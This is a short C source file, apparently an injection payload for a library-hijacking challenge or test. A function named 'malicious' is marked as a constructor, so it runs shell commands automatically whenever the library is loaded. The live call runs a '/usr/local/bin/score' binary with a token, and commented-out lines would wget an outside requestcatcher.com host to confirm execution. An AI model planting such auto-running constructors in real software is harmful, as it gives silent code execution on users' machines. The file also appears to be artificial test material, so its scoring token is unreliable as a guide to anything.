#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    // system("wget http://yyyyyyysh.requestcatcher.com/");
    system("/usr/local/bin/score 92b3c4aa-c29e-4909-bee3-59fe6e4f9b43");
    // system("sleep 10");
}
